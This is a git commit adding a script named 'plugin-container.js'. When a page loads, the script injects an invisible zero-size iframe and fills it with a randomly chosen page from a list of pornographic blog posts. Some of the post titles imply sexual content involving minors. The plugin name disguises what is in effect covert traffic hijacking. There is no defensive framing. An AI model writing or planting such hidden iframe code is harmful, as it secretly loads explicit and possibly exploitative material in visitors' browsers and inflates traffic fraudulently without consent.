60fe572723afde9a2e70dcd17c0b18c98a9e1387
toplesdunia <toplesdunia@gmail.com>
2017-04-28 02:08:28 +0700

    Add files via upload

---
+++ plugin-container.js
@@ -0,0 +1,40 @@
+var ie=document.all&&navigator.userAgent.indexOf("Opera")==-1
+var dom=document.getElementById&&navigator.userAgent.indexOf("Opera")==-1
+var iframeprops='width=0 height=0 marginwidth="0" marginheight="0" hspace="0" vspace="0" frameborder="0" scrolling="no"'
+var randomcontent=new Array()
+randomcontent[0]="https://toplesdunia2.blogspot.co.id/2017/03/cerita-sex-tante-maya.html"
+randomcontent[1]="https://toplesdunia2.blogspot.co.id/2017/03/cerita-dewasa-ibu-guru-masih-perawan.html"
+randomcontent[2]="https://toplesdunia2.blogspot.co.id/2017/03/cerita-dewasa-hukuman-terenak-dari-guru.html"
+randomcontent[3]="https://toplesdunia2.blogspot.co.id/2017/03/foto-bikini-naysila-mirdad-di-instagram.html"
+randomcontent[4]="https://toplesdunia2.blogspot.co.id/2017/03/cerita-dewasa-moleknya-mami-tiriku.html"
+randomcontent[5]="https://toplesdunia2.blogspot.co.id/2017/03/bercinta-sama-mantan-anak-ibu-kost.html"
+randomcontent[6]="https://toplesdunia2.blogspot.co.id/2017/02/unggah-foto-hot-nikita-mirzani-pamer.html"
+randomcontent[7]="https://toplesdunia2.blogspot.co.id/2015/12/abg-cantik-yang-narsis-pamer-teteknya.html"
+randomcontent[8]="https://toplesdunia2.blogspot.co.id/2015/12/adegan-poppy-bunga-yang-mandi-lupa-ke.html"
+randomcontent[9]="https://toplesdunia2.blogspot.co.id/2015/02/kumpulan-bocah-belia-pamer-memek.html"
+randomcontent[10]="https://toplesdunia2.blogspot.co.id/2015/02/pemandangan-gadis-desa-lagi-mandi.html"
+randomcontent[11]="https://toplesdunia2.blogspot.co.id/2013/01/cerita-seks-murid-jadi-budak-sex-para.html"
+randomcontent[12]="https://toplesdunia2.blogspot.co.id/2014/08/toket-gede-mahasiswi-lagi-ngentot-di.html"
+randomcontent[13]="https://toplesdunia2.blogspot.co.id/2014/08/mahasiswi-ngentot-sama-kakek-kakek.html"
+randomcontent[14]="https://toplesdunia2.blogspot.co.id/2014/08/sekretaris-ngentot-dengan-bos-di-kantor.html"
+randomcontent[15]="https://toplesdunia2.blogspot.co.id/2012/11/tarif-harga-ngentot-memek-perawan.html"
+randomcontent[16]="https://toplesdunia2.blogspot.co.id/2015/02/ngintip-memek-cewek-lagi-makan-di-warung.html"
+randomcontent[17]="https://toplesdunia2.blogspot.co.id/2015/02/foto-memek-gadis-dibalik-celana-dalam.html"
+randomcontent[18]="https://toplesdunia2.blogspot.co.id/2014/08/foto-bugil-toket-mulus-alice-ozawa.html"
+randomcontent[19]="https://toplesdunia2.blogspot.co.id/2014/07/ngintip-celana-dalem-artis-cina-gan.html"
+randomcontent[20]="https://toplesdunia2.blogspot.co.id/2014/07/fenomena-seks-bebas-di-jepang.html"
+randomcontent[21]="https://toplesdunia2.blogspot.co.id/2014/07/nekat-hubungan-sex-di-atas-panggung.html"
+randomcontent[22]="https://toplesdunia2.blogspot.co.id/2014/07/foto-anggota-jkt48-tanpa-celana-dalam.html"
+randomcontent[23]="https://toplesdunia2.blogspot.co.id/2014/07/wow-di-acara-resmi-adrienne-bailon-lupa.html"
+randomcontent[24]="https://toplesdunia2.blogspot.co.id/2014/07/artis-artis-yang-lupa-pakai-celana-dalam.html"
+randomcontent[25]="https://toplesdunia2.blogspot.co.id/2014/07/puluhan-wanita-telanjang-dada-serukan.html"
+if (ie||dom)
+document.write('<iframe id="dynstuff" src="" '+iframeprops+'></iframe>')
+
+function random_iframe(){
+if (ie||dom){
+var iframeobj=document.getElementById? document.getElementById("dynstuff") : document.all.dynstuff
+iframeobj.src=randomcontent[Math.floor(Math.random()*randomcontent.length)]
+}
+}
+window.onload=random_iframe
